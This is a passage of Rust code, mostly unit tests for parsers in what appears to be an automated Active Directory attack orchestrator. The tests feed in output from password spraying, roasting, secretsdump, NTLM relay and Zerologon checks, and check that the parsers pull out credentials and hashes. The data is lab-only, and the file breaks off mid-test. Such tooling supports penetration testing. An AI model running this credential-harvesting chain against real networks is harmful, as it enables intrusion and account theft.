/// exclude — netexec prints both lines on success-and-then-restore runs, so
/// we treat the *absence* of a negative marker as required.
///
/// Decision matrix:
///   - "VULNERABLE" present AND no "not vulnerable" line   → true
///   - "is vulnerable to zerologon" present AND no negative → true
///   - everything else (no marker, or any negative marker)  → false
pub(crate) fn is_zerologon_vulnerable(output: &str) -> bool {
    let lower = output.to_ascii_lowercase();
    // Negative markers win. Some netexec builds emit a banner line first
    // then a per-target verdict; if any line says the DC is not vulnerable
    // or the check skipped, we don't credit it.
    if lower.contains("not vulnerable")
        || lower.contains("is patched")
        || lower.contains("target appears patched")
    {
        return false;
    }
    // Positive markers: the literal token (netexec's column-formatted row)
    // OR the descriptive phrase. The phrase form is what older nxc builds
    // and the CME ancestor emitted, so we accept both.
    let positive_token = output
        .lines()
        .any(|l| l.contains(" VULNERABLE") || l.trim() == "VULNERABLE");
    let positive_phrase = lower.contains("vulnerable to zerologon")
        || lower.contains("zerologon: vulnerable")
        || lower.contains("[+] domain is vulnerable");
    positive_token || positive_phrase
}

/// Check if a string looks like an IPv4 address (public for recon module).
pub fn looks_like_ip_pub(s: &str) -> bool {
    let parts: Vec<&str> = s.split('.').collect();
    parts.len() == 4 && parts.iter().all(|p| p.parse::<u8>().is_ok())
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    // ── empty_harvest_advisory ──────────────────────────────────────────────

    #[test]
    fn empty_harvest_advisory_fires_on_zero_yield_spray() {
        // password_spray that parsed no credentials → advisory.
        let note = empty_harvest_advisory("password_spray", None);
        assert!(note.is_some());
        let note = note.unwrap();
        assert!(note.contains("password_spray"));
        assert!(note.contains("Enumerate real accounts first"));
    }

    #[test]
    fn empty_harvest_advisory_fires_when_only_unrelated_discoveries() {
        // asrep_roast that surfaced hosts (via MSSQL SPN enrichment) but no
        // hashes / users still counts as a zero-yield harvest.
        let disc = json!({ "hosts": [{ "ip": "192.168.58.10" }] });
        assert!(empty_harvest_advisory("asrep_roast", Some(&disc)).is_some());
    }

    #[test]
    fn empty_harvest_advisory_silent_when_credentials_found() {
        let disc = json!({ "credentials": [{ "username": "alice" }] });
        assert!(empty_harvest_advisory("password_spray", Some(&disc)).is_none());
    }

    #[test]
    fn empty_harvest_advisory_silent_when_hashes_found() {
        let disc = json!({ "hashes": [{ "username": "svc_sql" }] });
        assert!(empty_harvest_advisory("asrep_roast", Some(&disc)).is_none());
    }

    #[test]
    fn empty_harvest_advisory_silent_when_users_enumerated() {
        // kerberos_user_enum_noauth's whole job is enumerating users — a run
        // that found some is productive, no advisory.
        let disc = json!({ "discovered_users": [{ "username": "bob" }] });
        assert!(empty_harvest_advisory("kerberos_user_enum_noauth", Some(&disc)).is_none());
    }

    #[test]
    fn empty_harvest_advisory_silent_for_non_harvest_tools() {
        // Authenticated / non-harvest tools never get the advisory even on
        // empty output — secretsdump with no output is a real failure the
        // orchestrator handles elsewhere.
        assert!(empty_harvest_advisory("secretsdump", None).is_none());
        assert!(empty_harvest_advisory("nmap_scan", None).is_none());
        assert!(empty_harvest_advisory("kerberoast", None).is_none());
    }

    #[test]
    fn empty_harvest_advisory_treats_empty_arrays_as_zero_yield() {
        let disc = json!({ "credentials": [], "hashes": [], "discovered_users": [] });
        assert!(empty_harvest_advisory("username_as_password", Some(&disc)).is_some());
    }

    #[test]
    fn parse_nmap_with_services() {
        let output = r#"Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-08 11:12 UTC
Nmap scan report for dc01.contoso.local (192.168.58.210)
Host is up (0.0010s latency).
Not shown: 994 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 4.32 seconds"#;

        let params = json!({"target": "192.168.58.210"});
        let hosts = parse_nmap_output(output, &params);

        assert_eq!(hosts.len(), 1, "Should produce exactly one host");
        let host = &hosts[0];
        assert_eq!(host["ip"], "192.168.58.210");
        let services = host["services"].as_array().unwrap();
        assert!(
            services.len() >= 5,
            "Should have at least 5 services, got {}",
            services.len()
        );
        assert!(services.iter().any(|s| s.as_str().unwrap().contains("445")));
        assert!(services
            .iter()
            .any(|s| s.as_str().unwrap().contains("1433")));
    }

    #[test]
    fn parse_nmap_with_stderr_separator() {
        // combined() output includes stderr
        let output = "Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-08 11:12 UTC\n\
Nmap scan report for dc01.contoso.local (192.168.58.210)\n\
PORT    STATE SERVICE\n\
88/tcp  open  kerberos-sec\n\
389/tcp open  ldap\n\
445/tcp open  microsoft-ds\n\
\n\
Nmap done: 1 IP address (1 host up) scanned in 2.10 seconds\n\
\n\
--- stderr ---\n\
Warning: some warning here";

        let params = json!({"target": "192.168.58.210"});
        let hosts = parse_nmap_output(output, &params);

        assert_eq!(hosts.len(), 1);
        let host = &hosts[0];
        assert_eq!(host["ip"], "192.168.58.210");
        assert_eq!(host["hostname"], "dc01.contoso.local");
        assert!(
            host["is_dc"].as_bool().unwrap(),
            "Should detect DC from kerberos+ldap"
        );
        let services = host["services"].as_array().unwrap();
        assert_eq!(services.len(), 3);
    }

    #[test]
    fn parse_nmap_fallback_no_output() {
        let output = "";
        let params = json!({"target": "192.168.58.210"});
        let hosts = parse_nmap_output(output, &params);

        assert_eq!(hosts.len(), 1);
        assert_eq!(hosts[0]["ip"], "192.168.58.210");
        assert!(hosts[0]["services"].as_array().unwrap().is_empty());
    }

    #[test]
    fn parse_nmap_multiple_hosts() {
        let output = "Nmap scan report for dc01.contoso.local (192.168.58.210)\n\
PORT    STATE SERVICE\n\
88/tcp  open  kerberos-sec\n\
445/tcp open  microsoft-ds\n\
\n\
Nmap scan report for srv01.contoso.local (192.168.58.211)\n\
PORT     STATE SERVICE\n\
445/tcp  open  microsoft-ds\n\
1433/tcp open  ms-sql-s";

        let params = json!({"target": "192.168.58.210"});
        let hosts = parse_nmap_output(output, &params);

        assert_eq!(hosts.len(), 2);
        assert_eq!(hosts[0]["ip"], "192.168.58.210");
        assert!(hosts[0]["is_dc"].as_bool().unwrap());
        assert_eq!(hosts[1]["ip"], "192.168.58.211");
        assert!(!hosts[1]["is_dc"].as_bool().unwrap());
    }

    #[test]
    fn parse_netexec_users_table_format() {
        let output = r#"SMB         192.168.58.121  445    DC01       [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:child.contoso.local) (signing:True) (SMBv1:False)
SMB         192.168.58.121  445    DC01       [+] child.contoso.local\:
SMB         192.168.58.121  445    DC01       -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         192.168.58.121  445    DC01       alice.johnson                 2026-03-25 23:21:09 0       Alice Johnson
SMB         192.168.58.121  445    DC01       bob.smith                     2026-03-25 23:21:09 0       Bob Smith
SMB         192.168.58.121  445    DC01       carol.williams                2026-03-25 23:21:09 0       Carol Williams
SMB         192.168.58.121  445    DC01       dave.miller                   2026-03-25 23:22:25 0       Dave Miller (Password : Summer2026!)
SMB         192.168.58.121  445    DC01       eve.davis                     2026-03-25 23:22:25 0       Eve Davis
SMB         192.168.58.121  445    DC01       Guest                         <never>             0       Built-in account for guest access
SMB         192.168.58.121  445    DC01       [*] Enumerated 10 local users: CHILD"#;

        let users = parse_netexec_users(output);

        // Should have 6 user entries + 1 _credentials marker (Guest is included)
        let user_entries: Vec<_> = users
            .iter()
            .filter(|u| u.get("username").is_some())
            .collect();
        assert!(
            user_entries.len() >= 6,
            "Should have at least 6 users (including Guest), got {}",
            user_entries.len()
        );

        // Check domain was extracted from banner
        assert_eq!(user_entries[0]["domain"], "child.contoso.local");
        assert_eq!(user_entries[0]["username"], "alice.johnson");

        // Check password leak extraction
        let cred_marker = users.iter().find(|u| u.get("_credentials").is_some());
        assert!(cred_marker.is_some(), "Should have _credentials marker");
        let creds = cred_marker.unwrap()["_credentials"].as_array().unwrap();
        assert_eq!(creds.len(), 1);
        assert_eq!(creds[0]["username"], "dave.miller");
        assert_eq!(creds[0]["password"], "Summer2026!");

        // Guest should be included.
        assert!(user_entries.iter().any(|u| u["username"] == "Guest"));

        // All users should have netexec_user_enum source
        assert!(user_entries
            .iter()
            .all(|u| u["source"] == "netexec_user_enum"));
    }

    #[test]
    fn parse_netexec_users_rid_brute_format() {
        let output = r#"SMB  192.168.58.121  445  DC01  [+] child.contoso.local\:
SMB  192.168.58.121  445  DC01  CHILD\alice.johnson (SidTypeUser)
SMB  192.168.58.121  445  DC01  CHILD\bob.smith (SidTypeUser)"#;

        let users = parse_netexec_users(output);
        let user_entries: Vec<_> = users
            .iter()
            .filter(|u| u.get("username").is_some())
            .collect();
        assert_eq!(user_entries.len(), 2);
        assert_eq!(user_entries[0]["username"], "alice.johnson");
        assert_eq!(user_entries[0]["domain"], "CHILD");
    }

    #[test]
    fn parse_tool_output_enumerate_users_extracts_creds() {
        let output = r#"SMB  192.168.58.121  445  DC01  [*] Windows 10 (name:DC01) (domain:contoso.local) (signing:True)
SMB  192.168.58.121  445  DC01  [+] contoso.local\:
SMB  192.168.58.121  445  DC01  -Username-  -Last PW Set-  -BadPW- -Description-
SMB  192.168.58.121  445  DC01  alice       2026-03-25 23:21:09 0  Alice (Password : Welcome1!)
SMB  192.168.58.121  445  DC01  bob         2026-03-25 23:21:09 0  Bob"#;

        let params = json!({"target": "192.168.58.121"});
        let discoveries = parse_tool_output("enumerate_users", output, &params);

        // Should have users
        let users = discoveries["discovered_users"].as_array().unwrap();
        assert_eq!(users.len(), 2);

        // Should have extracted credential from description
        let creds = discoveries["credentials"].as_array().unwrap();
        assert_eq!(creds.len(), 1);
        assert_eq!(creds[0]["username"], "alice");
        assert_eq!(creds[0]["password"], "Welcome1!");
    }

    #[test]
    fn parse_tool_output_esc3_chain_extracts_hash() {
        // Regression: certipy_esc3_full_chain ends in a `certipy auth` step and
        // renders the same combined output as the esc1/4/7/13 chains, but was
        // missing from their match arm, so its hash hit the default arm.
        let output = "\
=== certipy auth ===\n\
[*] Got hash for 'administrator@contoso.local': aad3b435b51404eeaad3b435b51404ee:8502bb1006c05667504ad00db6225150";
        let params = json!({"domain": "contoso.local"});
        let disc = parse_tool_output("certipy_esc3_full_chain", output, &params);
        let hashes = disc["hashes"].as_array().expect("hashes array");
        assert_eq!(hashes.len(), 1);
        assert_eq!(hashes[0]["username"], "administrator");
    }

    #[test]
    fn parse_tool_output_add_computer_records_machine_account() {
        // The created account is only in the success banner; without an arm the
        // credential is lost and later RBCD steps cannot resolve the principal.
        let params = json!({ "domain": "contoso.local" });
        let disc = parse_tool_output(
            "add_computer",
            "[*] Successfully added machine account ARES-1A2B3C4D$ with password P@ssw0rd!.",
            &params,
        );
        let creds = disc["credentials"].as_array().expect("credentials array");
        assert_eq!(creds.len(), 1);
        assert_eq!(creds[0]["username"], "ARES-1A2B3C4D$");
        assert_eq!(creds[0]["domain"], "contoso.local");
    }

    #[test]
    fn parse_tool_output_certipy_auth_extracts_hash() {
        // Regression: bare `certipy_auth` must surface its "Got hash for" line
        // into discoveries.hashes (was silently dropped by the default arm).
        let output = "\
[*] Using principal: 'dc02$@child.contoso.local'\n\
[*] Trying to get TGT...\n\
[*] Got TGT\n\
[*] Got hash for 'dc02$@child.contoso.local': aad3b435b51404eeaad3b435b51404ee:8502bb1006c05667504ad00db6225150";
        let params = json!({"domain": "child.contoso.local"});
        let disc = parse_tool_output("certipy_auth", output, &params);
        let hashes = disc["hashes"].as_array().expect("hashes array");
        assert_eq!(hashes.len(), 1);
        assert_eq!(hashes[0]["username"], "dc02$");
        assert_eq!(hashes[0]["domain"], "child.contoso.local");
        assert_eq!(hashes[0]["hash_type"], "NTLM");
    }

    #[test]
    fn looks_like_ip_valid() {
        assert!(looks_like_ip("192.168.58.10"));
        assert!(looks_like_ip("192.168.58.10"));
        assert!(looks_like_ip("0.0.0.0"));
        assert!(looks_like_ip("255.255.255.255"));
    }

    #[test]
    fn looks_like_ip_invalid() {
        assert!(!looks_like_ip("not-an-ip"));
        assert!(!looks_like_ip("192.168.58"));
        assert!(!looks_like_ip("192.168.58.10.5"));
        assert!(!looks_like_ip("256.0.0.1")); // 256 > u8
        assert!(!looks_like_ip("dc01.contoso.local"));
        assert!(!looks_like_ip(""));
    }

    #[test]
    fn merge_discoveries_combines_arrays() {
        let d1 = json!({
            "hosts": [{"ip": "192.168.58.10"}],
            "credentials": [{"username": "admin"}],
        });
        let d2 = json!({
            "hosts": [{"ip": "192.168.58.20"}],
            "hashes": [{"username": "krbtgt"}],
        });
        let merged = merge_discoveries(&[d1, d2]);
        assert_eq!(merged["hosts"].as_array().unwrap().len(), 2);
        assert_eq!(merged["credentials"].as_array().unwrap().len(), 1);
        assert_eq!(merged["hashes"].as_array().unwrap().len(), 1);
    }

    #[test]
    fn merge_discoveries_dedup_hosts_by_ip() {
        let d1 = json!({
            "hosts": [
                {"ip": "192.168.58.10", "is_dc": false, "services": ["445/tcp"]},
            ],
        });
        let d2 = json!({
            "hosts": [
                {"ip": "192.168.58.10", "is_dc": true, "hostname": "dc01.contoso.local",
                 "services": ["88/tcp", "389/tcp", "445/tcp"]},
            ],
        });
        let merged = merge_discoveries(&[d1, d2]);
        let hosts = merged["hosts"].as_array().unwrap();
        assert_eq!(hosts.len(), 1, "Should dedup by IP");
        assert!(hosts[0]["is_dc"].as_bool().unwrap(), "Should keep DC entry");
        assert_eq!(hosts[0]["services"].as_array().unwrap().len(), 3);
    }

    #[test]
    fn merge_discoveries_empty_input() {
        let merged = merge_discoveries(&[]);
        assert!(merged["hosts"].is_null());
        assert!(merged["credentials"].is_null());
    }

    #[test]
    fn merge_discoveries_single_input() {
        let d = json!({"vulnerabilities": [{"vuln_id": "v1"}]});
        let merged = merge_discoveries(&[d]);
        assert_eq!(merged["vulnerabilities"].as_array().unwrap().len(), 1);
    }

    #[test]
    fn parse_tool_output_secretsdump() {
        let output = "Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::";
        let params = json!({"domain": "contoso.local"});
        let disc = parse_tool_output("secretsdump", output, &params);
        assert!(!disc["hashes"].as_array().unwrap().is_empty());
    }

    #[test]
    fn parse_tool_output_mssql_far_host_secretsdump() {
        // The far-host hive dump emits standard `impacket-secretsdump LOCAL`
        // output. It MUST route through parse_secretsdump — otherwise every
        // harvested hash falls through to the `_ => {}` default and the tool
        // becomes a no-op. Local SAM rows attribute with empty domain; a
        // cached-domain row picks up target_domain (the far realm).
        let output = "[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\n\
             Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::\n\
             [*] Dumping cached domain logon information (domain/username:hash)\n\
             FABRIKAM.LOCAL/svc_far:$DCC2$10240#svc_far#0123456789abcdef0123456789abcdef";
        let params = json!({"target_domain": "fabrikam.local", "domain": "contoso.local"});
        let disc = parse_tool_output("mssql_far_host_secretsdump", output, &params);
        assert!(
            !disc["hashes"].as_array().unwrap().is_empty(),
            "far-host secretsdump output must yield hashes"
        );
    }

    #[test]
    fn parse_tool_output_kerberoast() {
        let output = "$krb5tgs$23$*svc_sql$CONTOSO$contoso.local/svc_sql*$abc";
        let params = json!({"domain": "contoso.local"});
        let disc = parse_tool_output("kerberoast", output, &params);
        assert_eq!(disc["hashes"].as_array().unwrap().len(), 1);
    }

    #[test]
    fn parse_tool_output_unknown_tool() {
        let disc = parse_tool_output("unknown_tool", "output", &json!({}));
        assert_eq!(disc, json!({}));
    }

    #[test]
    fn parse_tool_output_find_delegation() {
        let output = "svc_sql$  Computer  Constrained  CIFS/dc01.contoso.local";
        let params = json!({"domain": "contoso.local", "target_ip": "192.168.58.10"});
        let disc = parse_tool_output("find_delegation", output, &params);
        assert_eq!(disc["vulnerabilities"].as_array().unwrap().len(), 1);
    }

    #[test]
    fn kerberos_user_enum_all_variants() {
        // Test all three output variants from impacket-GetNPUsers
        let output = r#"Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Getting TGT for Administrator
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_sql does not have UF_DONT_REQUIRE_PREAUTH set
[-] User disabled_acct - Loss of credentials through KDC_ERR_CLIENT_REVOKED
[-] invalid principal syntax
"#;

        let params = json!({"domain": "contoso.local", "dc_ip": "192.168.58.10"});
        let disc = parse_tool_output("kerberos_user_enum_noauth", output, &params);
        let users = disc["discovered_users"].as_array().unwrap();
        assert_eq!(users.len(), 3, "Should find 3 valid users, got {:?}", users);

        let names: Vec<&str> = users
            .iter()
            .map(|u| u["username"].as_str().unwrap())
            .collect();
        assert!(names.contains(&"Administrator"));
        assert!(names.contains(&"svc_sql"));
        assert!(names.contains(&"disabled_acct"));

        // All should have domain set
        for u in users {
            assert_eq!(u["domain"], "contoso.local");
            assert_eq!(u["source"], "kerberos_enum");
        }
    }

    #[test]
    fn kerberos_user_enum_strips_upn_suffix() {
        // GetNPUsers echoes the principal exactly as supplied. When the
        // userlist carried a UPN-form entry, the `[-] User sam@realm ...`
        // line must yield the bare sAMAccountName, not the whole UPN — else
        // loot renders a doubled `DOMAIN\sam@realm`.
        let output = "\
[-] User bob@child.contoso.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User alice does not have UF_DONT_REQUIRE_PREAUTH set
";
        let params = json!({"domain": "child.contoso.local", "dc_ip": "192.168.58.10"});
        let disc = parse_tool_output("kerberos_user_enum_noauth", output, &params);
        let users = disc["discovered_users"].as_array().unwrap();
        let names: Vec<&str> = users
            .iter()
            .map(|u| u["username"].as_str().unwrap())
            .collect();
        assert!(
            names.contains(&"bob"),
            "UPN must be reduced to sAM, got {names:?}"
        );
        assert!(
            !names.iter().any(|n| n.contains('@')),
            "no UPN survives: {names:?}"
        );
        assert!(names.contains(&"alice"));
        for u in users {
            assert_eq!(u["domain"], "child.contoso.local");
        }
    }

    #[test]
    fn kerberos_user_enum_upn_domain_fallback_when_task_domainless() {
        // No task domain: the UPN realm becomes the user's domain instead of
        // an empty string.
        let output = "[-] User carol@contoso.local doesn't have UF_DONT_REQUIRE_PREAUTH set\n";
        let params = json!({"dc_ip": "192.168.58.10"});
        let disc = parse_tool_output("kerberos_user_enum_noauth", output, &params);
        let users = disc["discovered_users"].as_array().unwrap();
        assert_eq!(users[0]["username"], "carol");
        assert_eq!(users[0]["domain"], "contoso.local");
    }

    #[test]
    fn parse_tool_output_username_as_password_filters() {
        // Only creds where password == username should be kept
        let output = "[+] 192.168.58.1 CONTOSO\\alice:alice (Pwn3d!)\n\
                      [+] 192.168.58.1 CONTOSO\\bob:Password1 (Pwn3d!)";
        let params = json!({"domain": "contoso.local", "target_ip": "192.168.58.1"});
        let disc = parse_tool_output("username_as_password", output, &params);
        let creds = disc["credentials"].as_array().unwrap();
        assert_eq!(creds.len(), 1, "Only alice:alice should match");
        assert_eq!(creds[0]["username"].as_str().unwrap(), "alice");
    }

    #[test]
    fn parse_tool_output_adidnsdump() {
        let output = "dc01  A  192.168.58.10\nweb01  A  192.168.58.20";
        let disc = parse_tool_output("adidnsdump", output, &json!({}));
        let hosts = disc["hosts"].as_array().unwrap();
        assert_eq!(hosts.len(), 2);
    }

    #[test]
    fn merge_discoveries_trusted_domains_dedup() {
        let d1 =
            json!({"trusted_domains": [{"domain": "child.contoso.local", "type": "ParentChild"}]});
        let d2 =
            json!({"trusted_domains": [{"domain": "child.contoso.local", "type": "ParentChild"}]});
        let merged = merge_discoveries(&[d1, d2]);
        let td = merged["trusted_domains"].as_array().unwrap();
        assert_eq!(td.len(), 1, "Duplicate trusted domains should be deduped");
    }

    #[test]
    fn parse_tool_output_relay_and_coerce_emits_cert_vuln() {
        let output = "RELAY_PID=1234\n\
                      === Coercing via MS-DFSNM ===\n\
                      CERT_CAPTURED_VIA=MS-DFSNM\n\
                      PFX_FILE=/tmp/ares_relay_999/DC01$.pfx\n\
                      RELAYED_USER=DC01$\n\
                      === RELAY LOG ===\n\
                      [*] Servers started\n";
        let params = json!({
            "ca_host": "192.168.58.10",
            "coerce_target": "192.168.58.20",
            "target_domain": "contoso.local",
            "coerce_domain": "child.contoso.local",
        });
        let disc = parse_tool_output("relay_and_coerce", output, &params);
        let vulns = disc["vulnerabilities"].as_array().expect("vulns array");
        assert_eq!(vulns.len(), 1);
        assert_eq!(vulns[0]["vuln_type"], "certificate_obtained");
        assert_eq!(
            vulns[0]["details"]["pfx_path"],
            "/tmp/ares_relay_999/DC01$.pfx"
        );
        assert_eq!(vulns[0]["details"]["domain"], "contoso.local");
        assert_eq!(vulns[0]["details"]["target_user"], "DC01$");
        assert_eq!(vulns[0]["target"], "192.168.58.20");
    }

    #[test]
    fn parse_tool_output_relay_and_coerce_no_capture_no_vuln() {
        let output = "RELAY_PID=1234\n\
                      === Coercing via MS-DFSNM ===\n\
                      === Coercing via MS-EFSR ===\n\
                      === Coercing via MS-RPRN ===\n\
                      === RELAY LOG ===\n\
                      [*] Servers started\n";
        let params = json!({"ca_host": "192.168.58.10", "coerce_target": "192.168.58.20"});
        let disc = parse_tool_output("relay_and_coerce", output, &params);
        assert!(disc.get("vulnerabilities").is_none());
    }

    #[test]
    fn parse_tool_output_relay_and_coerce_falls_back_to_coerce_domain() {
        // Same-forest case: only coerce_domain present.
        let output = "PFX_FILE=/tmp/ares_relay_1/dc01$.pfx\nRELAYED_USER=dc01$\n";
        let params = json!({
            "ca_host": "192.168.58.10",
            "coerce_target": "192.168.58.20",
            "coerce_domain": "contoso.local",
        });
        let disc = parse_tool_output("relay_and_coerce", output, &params);
        let vulns = disc["vulnerabilities"].as_array().unwrap();
        assert_eq!(vulns[0]["details"]["domain"], "contoso.local");
    }

    #[test]
    fn parse_tool_output_relay_and_coerce_legacy_target_dc_alias() {
        // Backwards-compat: orchestrator state may still emit `target_dc`.
        let output = "PFX_FILE=/tmp/ares_relay_2/dc01$.pfx\nRELAYED_USER=dc01$\n";
        let params = json!({
            "ca_host": "192.168.58.10",
            "target_dc": "192.168.58.20",
            "coerce_domain": "contoso.local",
        });
        let disc = parse_tool_output("relay_and_coerce", output, &params);
        let vulns = disc["vulnerabilities"].as_array().unwrap();
        assert_eq!(vulns[0]["target"], "192.168.58.20");
    }

    #[test]
    fn parse_tool_output_smb_signing_check() {
        let output = "SMB  192.168.58.10  445  DC01  signing:True";
        let params = json!({"target": "192.168.58.10"});
        let disc = parse_tool_output("smb_signing_check", output, &params);
        // parse_smb_signing returns host entries
        assert!(disc.get("hosts").is_some() || disc == json!({}));
    }

    #[test]
    fn parse_tool_output_smb_sweep() {
        let output = "SMB  192.168.58.10  445  DC01  [*] Windows Server 2019 (name:DC01) (domain:contoso.local)";
        let disc = parse_tool_output("smb_sweep", output, &json!({}));
        let hosts = disc["hosts"].as_array().unwrap();
        assert_eq!(hosts.len(), 1);
    }

    #[test]
    fn parse_tool_output_enumerate_shares() {
        let output = "SMB  192.168.58.10  445  DC01  Share           Permissions  Remark\n\
                      SMB  192.168.58.10  445  DC01  -----           -----------  ------\n\
                      SMB  192.168.58.10  445  DC01  SYSVOL          READ         Logon server share";
        let disc = parse_tool_output("enumerate_shares", output, &json!({}));
        let shares = disc["shares"].as_array().unwrap();
        assert_eq!(shares.len(), 1);
    }

    #[test]
    fn parse_tool_output_run_bloodhound_empty() {
        let disc = parse_tool_output("run_bloodhound", "Collection complete", &json!({}));
        assert_eq!(disc, json!({}));
    }

    #[test]
    fn parse_tool_output_password_spray() {
        let output = "[+] 192.168.58.10 contoso.local\\svc_sql:Summer2024! (Pwn3d!)";
        let params = json!({"domain": "contoso.local", "target_ip": "192.168.58.10"});
        let disc = parse_tool_output("password_spray", output, &params);
        let creds = disc["credentials"].as_array().unwrap();
        assert!(!creds.is_empty());
    }

    #[test]
    fn parse_tool_output_crack_with_hashcat() {
        let output =
            "$krb5tgs$23$*svc_sql$CONTOSO.LOCAL$contoso.local/svc_sql*$abc$def:Summer2024!";
        let params = json!({"domain": "contoso.local"});
        let disc = parse_tool_output("crack_with_hashcat", output, &params);
        let creds = disc["credentials"].as_array().unwrap();
        assert!(!creds.is_empty());
    }

    #[test]
    fn parse_tool_output_crack_with_john() {
        let output = "svc_sql:Summer2024!::::::::\n1 password hash cracked, 0 left";
        let params = json!({"domain": "contoso.local"});
        let disc = parse_tool_output("crack_with_john", output, &params);
        let creds = disc["credentials"].as_array().unwrap();
        assert!(!creds.is_empty());
    }

    #[test]
    fn parse_tool_output_sysvol_spider() {
        let disc = parse_tool_output("sysvol_script_search", "no creds found", &json!({}));
        // No credentials found — should be empty
        assert!(disc.get("credentials").is_none());
    }

    #[test]
    fn parse_tool_output_asrep_roast() {
        let output = "$krb5asrep$23$brian.davis@CHILD.CONTOSO.LOCAL:aabbccdd";
        let params = json!({"domain": "child.contoso.local", "dc_ip": "192.168.58.10"});
        let disc = parse_tool_output("asrep_roast", output, &params);
        let hashes = disc["hashes"].as_array().unwrap();
        assert!(!hashes.is_empty());
    }

    #[test]
    fn parse_tool_output_lsassy() {
        // lsassy format: DOMAIN\user  hash_or_password
        let output = "contoso.local\\Administrator  aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42";
        let params = json!({"domain": "contoso.local", "target_ip": "192.168.58.10"});
        let disc = parse_tool_output("lsassy", output, &params);
        assert!(disc.get("hashes").is_some() || disc.get("credentials").is_some());
    }

    #[test]
    fn parse_tool_output_ldap_descriptions() {
        let output = "SMB  192.168.58.10  445  DC01  svc_test  2026-03-25 23:22:25 0  Service Account (Password : TestPass!)";
        let params = json!({"domain": "contoso.local", "target_ip": "192.168.58.10"});
        let disc = parse_tool_output("ldap_search_descriptions", output, &params);
        let creds = disc["credentials"].as_array().unwrap();
        assert!(!creds.is_empty());
    }

    #[test]
    fn parse_tool_output_secretsdump_kerberos() {
        let output = "Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::";
        let params = json!({"domain": "contoso.local"});
        let disc = parse_tool_output("secretsdump_kerberos", output, &params);
        assert!(!disc["hashes"].as_array().unwrap().is_empty());
    }

    #[test]
    fn merge_discoveries_host_more_services_wins() {
        let d1 = json!({"hosts": [{"ip": "192.168.58.1", "services": ["445/tcp"]}]});
        let d2 = json!({"hosts": [{"ip": "192.168.58.1", "services": ["80/tcp", "443/tcp", "445/tcp"]}]});
        let merged = merge_discoveries(&[d1, d2]);
        let hosts = merged["hosts"].as_array().unwrap();
        assert_eq!(hosts.len(), 1);
        assert_eq!(hosts[0]["services"].as_array().unwrap().len(), 3);
    }

    // ── is_zerologon_vulnerable ────────────────────────────────────────

    #[test]
    fn zerologon_vulnerable_token_only() {
        // Classic netexec column-formatted positive row.
        let out = "SMB         192.168.58.210  445    DC01             VULNERABLE";
        assert!(is_zerologon_vulnerable(out));
    }

    #[test]
    fn zerologon_vulnerable_descriptive_phrase() {
        // Older nxc / cme builds emit the descriptive phrase form.
        let out =
            "SMB         192.168.58.210  445    DC01             [+] DC01 is vulnerable to Zerologon - CVE-2020-1472";
        assert!(is_zerologon_vulnerable(out));
    }

    #[test]
    fn zerologon_vulnerable_phrase_case_insensitive() {
        let out = "SMB  10  445  DC  ZEROLOGON: VULNERABLE";
        assert!(is_zerologon_vulnerable(out));
    }

    #[test]
    fn zerologon_not_vulnerable_negative_marker_wins() {
        // The negative marker must override the descriptive line even when
        // the word "VULNERABLE" appears in a banner / module header.
        let out = "[*] Loading module zerologon (checks for VULNERABLE state)\n\
            SMB         192.168.58.210  445    DC01             Not vulnerable";
        assert!(!is_zerologon_vulnerable(out));
    }

    #[test]
    fn zerologon_not_vulnerable_explicit_phrase() {
        let out = "SMB         192.168.58.210  445    DC01             [-] DC01 is not vulnerable";
        assert!(!is_zerologon_vulnerable(out));
    }

    #[test]
    fn zerologon_patched_phrase() {
        let out =
            "SMB         192.168.58.210  445    DC01             Target appears patched (CVE-2020-1472)";
        assert!(!is_zerologon_vulnerable(out));
    }

    #[test]
    fn zerologon_no_evidence_in_empty_output() {
        assert!(!is_zerologon_vulnerable(""));
        assert!(!is_zerologon_vulnerable(
            "SMB  10  445  DC  Authenticating..."
        ));
    }

    #[test]
    fn zerologon_does_not_match_substring_vulnerable_inside_word() {
        // The token form looks for `\sVULNERABLE` (lead-space, exact). A
        // line containing "NOTVULNERABLE" or "INVULNERABLE" without a space
        // boundary must not match. (Bare-line " VULNERABLE" is still ok.)
        let out = "SMB         192.168.58.210  445    DC01             INVULNERABLE_TO_THIS_CHECK";
        assert!(!is_zerologon_vulnerable(out));
    }

    // ── parse_tool_output("zerologon_check", ...) integration ──────────

    #[test]
    fn parse_tool_output_zerologon_emits_vuln_on_positive() {
        let output = "SMB         192.168.58.210  445    DC01             VULNERABLE\n\
             SMB         192.168.58.210  445    DC01             Next step: see CVE-2020-1472";
        let params = json!({
            "dc_ip": "192.168.58.210",
            "domain": "contoso.local",
            "hostname": "dc01"
        });
        let discoveries = parse_tool_output("zerologon_check", output, &params);
        let vulns = discoveries["vulnerabilities"]
            .as_array()
            .expect("vulns array");
        assert_eq!(vulns.len(), 1);
        assert_eq!(vulns[0]["vuln_type"], "zerologon");
        assert_eq!(vulns[0]["target"], "192.168.58.210");
        assert_eq!(vulns[0]["vuln_id"], "zerologon_192_168_58_210");
        assert_eq!(vulns[0]["details"]["cve"], "CVE-2020-1472");
        assert_eq!(vulns[0]["details"]["domain"], "contoso.local");
        assert_eq!(vulns[0]["details"]["hostname"], "dc01");
    }

    #[test]
    fn parse_tool_output_zerologon_silent_on_patched_dc() {
        let output = "SMB  192.168.58.210  445  DC01  Not vulnerable";
        let params = json!({"dc_ip": "192.168.58.210"});
        let discoveries = parse_tool_output("zerologon_check", output, &params);
